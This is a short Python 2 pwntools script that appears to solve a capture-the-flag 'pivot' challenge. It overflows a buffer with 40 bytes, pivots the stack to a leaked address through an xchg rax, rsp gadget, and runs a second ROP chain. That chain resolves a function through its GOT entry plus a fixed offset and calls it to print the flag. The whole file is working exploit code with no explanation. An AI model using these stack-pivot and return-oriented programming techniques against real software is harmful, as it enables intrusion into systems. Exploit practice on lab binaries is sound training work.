#!/usr/bin/env python2.7

from pwn import *

p = gdb.debug("./pivot", '''
        set follow-fork-mode child
        b *0x400b00
        continue
        :''')

pivot = int(p.recv().split("pivot: ")[1].split("\n")[0], 0)

log.info("Second chain starts at: " + hex(pivot))

pop_rax =       p64(0x400b00) # pop rax; ret
xchg_rax_rsp =  p64(0x400b02) # xchg rax, rsp; ret

# Pivot onto second chain
chain1 = "A" * 40
chain1 += pop_rax + p64(pivot)
chain1 += xchg_rax_rsp
chain1 += "\x0a"

foothold_function   = p64(0x400850) # address
foothold_got        = p64(0x602048) # address
puts                = p64(0x400800) # jmp puts; ret
pop_rdi             = p64(0x400b73) # pop rdi; ret
mov_rax_rax         = p64(0x400b05) # mov rax, [rax]; ret
pop_rbp             = p64(0x400948) # pop rbp; ret
add_rax_rbp         = p64(0x400b09) # add rax, rbp; ret
call_rax            = p64(0x40098e) # call rax; pop rbp; jmp register_tm_clones;

# Try to leak address of foothold_function
chain2 = ""
chain2 += foothold_function
chain2 += pop_rax + foothold_got
chain2 += mov_rax_rax
chain2 += pop_rbp + p64(0x14e)
chain2 += add_rax_rbp
chain2 += call_rax
chain2 += "\x0a"

p.send(chain2)

p.recv()

p.send(chain1)

p.recv()
log.success("Flag: " + p.recv())

p.wait_for_close()
